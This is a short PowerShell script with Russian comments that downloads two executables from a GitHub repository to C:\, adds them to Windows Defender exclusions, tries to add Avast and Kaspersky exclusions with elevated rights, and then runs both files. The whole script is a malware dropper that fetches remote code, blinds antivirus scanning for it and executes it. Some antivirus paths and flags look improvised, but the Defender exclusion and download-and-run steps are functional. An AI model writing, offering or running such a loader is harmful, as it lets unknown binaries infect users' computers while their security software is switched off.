# Функция для добавления файла в исключения Windows Defender
function Add-To-WindowsDefender-Exclusion {
    param (
        [string]$filePath
    )
    Add-MpPreference -ExclusionPath $filePath
}

# Функция для добавления файла в исключения Avast Antivirus
function Add-To-Avast-Exclusion {
    param (
        [string]$filePath
    )
    if (Test-Path "C:\Program Files\AVAST Software\Avast\avast.exe") {
        Start-Process -FilePath "C:\Program Files\AVAST Software\Avast\avast.exe" -ArgumentList "/exclude add $filePath" -Verb RunAs -Wait
    } else {
        Write-Output "Avast Antivirus не найден."
    }
}

# Функция для добавления файла в исключения Kaspersky Antivirus
function Add-To-Kaspersky-Exclusion {
    param (
        [string]$filePath
    )
    $kasperskyPath = "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Anti-Virus 20.xx\avp.com"
    if (Test-Path $kasperskyPath) {
        Start-Process -FilePath $kasperskyPath -ArgumentList "/add-exclusion=$filePath" -Verb RunAs -Wait
    } else {
        Write-Output "Kaspersky Antivirus не найден."
    }
}

# Пути к файлам
$file1 = "C:\1.exe"
$file2 = "C:\2.exe"

# Проверка существования URL перед загрузкой
$urls = @("https://github.com/cs2cc/s/raw/main/1.exe", "https://github.com/cs2cc/s/raw/main/2.exe")

$urls | ForEach-Object {
    $outFile = if ($_ -like "*1.exe") { $file1 } else { $file2 }
    try {
        Invoke-WebRequest -Uri $_ -OutFile $outFile -ErrorAction Stop
    } catch {
        Write-Output "Не удалось загрузить файл по адресу $_"
    }
}

# Добавление в исключения Windows Defender
Add-To-WindowsDefender-Exclusion -filePath $file1
Add-To-WindowsDefender-Exclusion -filePath $file2

# Добавление в исключения Avast Antivirus
Add-To-Avast-Exclusion -filePath $file1
Add-To-Avast-Exclusion -filePath $file2

# Добавление в исключения Kaspersky Antivirus
Add-To-Kaspersky-Exclusion -filePath $file1
Add-To-Kaspersky-Exclusion -filePath $file2

# Запуск файлов
if (Test-Path $file1) {
    Start-Process -FilePath $file1
} else {
    Write-Output "$file1 не найден."
}

if (Test-Path $file2) {
    Start-Process -FilePath $file2
} else {
    Write-Output "$file2 не найден."
}
